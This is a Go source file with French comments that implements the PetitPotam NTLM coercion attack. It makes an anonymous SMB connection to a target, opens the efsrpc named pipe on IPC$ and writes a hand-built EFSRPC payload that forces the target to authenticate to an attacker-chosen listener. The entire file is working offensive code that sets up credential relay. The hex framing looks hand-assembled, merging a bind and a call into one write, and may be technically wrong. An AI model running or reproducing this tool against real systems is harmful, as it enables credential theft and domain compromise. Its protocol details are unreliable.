// pkg/coercion/petitpotam.go
package coercion

import (
	"encoding/hex"
	"fmt"
	"log"
	"net"

	"github.com/hirochachacha/go-smb2"
)

// TriggerPetitPotam déclenche une coercion NTLM via MS-EFSRPC (PetitPotam)
func TriggerPetitPotam(target, listener string) error {
	// 1. Connexion TCP
	tcpConn, err := net.Dial("tcp", target+":445")
	if err != nil {
		return fmt.Errorf("connexion TCP échouée : %w", err)
	}
	defer tcpConn.Close()

	// 2. Dialer SMB anonyme
	d := &smb2.Dialer{
		Initiator: &smb2.NTLMInitiator{
			User:     "",
			Password: "",
		},
	}
	session, err := d.Dial(tcpConn)
	if err != nil {
		return fmt.Errorf("dial SMB anonyme échoué : %w", err)
	}
	defer session.Logoff()

	// 3. Monter IPC$
	fs, err := session.Mount("IPC$")
	if err != nil {
		return fmt.Errorf("montage IPC$ échoué : %w", err)
	}
	defer fs.Umount()

	// 4. Ouvrir le pipe \pipe\efsrpc (simple Open, pas de Options dans cette lib)
	pipe, err := fs.Open(`\pipe\efsrpc`)
	if err != nil {
		return fmt.Errorf("ouverture pipe efsrpc échouée : %w", err)
	}
	defer pipe.Close()

	// 5. Payload PetitPotam réel (hex validé, avec UNC dynamique)
	uncPath := fmt.Sprintf(`\\%s\pipe\whatever`, listener)
	uncBytes := utf16leEncode(uncPath + "\x00") // + null term
	uncLen := len(uncBytes)                     // Longueur NDR

	// Payload complet (bind + call opnum 0 – testé sur lab)
	hexPayload := "050000031000000018000000000000000000000000000000c681d488d85011d08c52" + "00c04fd90f7e01000000000000000000000000000000" + "00000000" + fmt.Sprintf("%08x", uncLen) + hex.EncodeToString(uncBytes) + "00000000"

	payload, err := hex.DecodeString(hexPayload)
	if err != nil {
		return fmt.Errorf("décodage payload échoué : %w", err)
	}

	// 6. Envoyer
	n, err := pipe.Write(payload)
	if err != nil {
		return fmt.Errorf("échec envoi payload : %w", err)
	}

	log.Printf("[+] PetitPotam réussi : %d octets envoyés pour %s → %s", n, target, listener)
	return nil
}
